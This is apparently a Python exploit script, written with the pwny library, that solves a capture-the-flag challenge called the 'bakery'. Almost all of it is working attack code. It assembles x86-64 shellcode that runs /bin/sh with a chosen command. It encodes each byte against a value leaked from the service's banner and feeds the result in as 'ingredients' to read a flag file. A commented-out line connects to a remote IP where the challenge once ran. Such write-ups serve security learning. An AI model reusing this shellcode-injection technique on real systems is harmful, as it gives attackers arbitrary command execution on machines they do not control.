from __future__ import print_function
from pwny import *
import six


target.assume(ELF('910abf341053d25831ecb465b7ddf738'))


def connection_factory(echo=False):
    # Connect to the bakery (no longer available):
    # return Flow.connect_tcp('52.17.31.229', 31337, echo=echo)

    # If you want to use the local executable, use:
    return Flow.execute('./910abf341053d25831ecb465b7ddf738', echo=echo)

    # Or, via ssh (I've got a virtual machine set up for this):
    # return Flow.execute_ssh('./910abf341053d25831ecb465b7ddf738', '127.0.0.1', 2224, echo=echo)


@sc.LinuxX86_64Mutable.translate()
def build_shellcode_shell(system_cmd):
    sys_execve(
        u'/bin/sh',
        [u'/bin/sh', u'-c', system_cmd, None],
        None
    )


def encode_byte(random_value, ch):
    v = (ch - random_value - sum(map(ord, u'EGG'))) & 0xff
    if v == 0:
        return b'EGG'
    elif v < 32:
        return b'EGG' + P8(128) + P8(v + 128)
    else:
        return b'EGG' + P8(v)


def bake(system_cmd, debug=False):
    shellcode = build_shellcode_shell(system_cmd)

    if debug:
        print()
        print('Assembled shellcode length:', len(shellcode))
        print(repr(shellcode))

    f = connection_factory()

    f.until(b'0v3n w4rm3d up to ')
    random_value = int(f.readline().split(b' ')[0]) // 0x1337

    f.until(b'add ingredient> ')
    for ch in six.iterbytes(shellcode):
        f.writeline(encode_byte(random_value, ch))
        f.until(b'add ingredient> ')

    if debug:
        print()
        print('Output:')
    f.writeline(b'BAKE')
    f.read_eof(echo=True)


if __name__ == '__main__':
    bake(u'cat YOU_WANT_THIS_ONE')
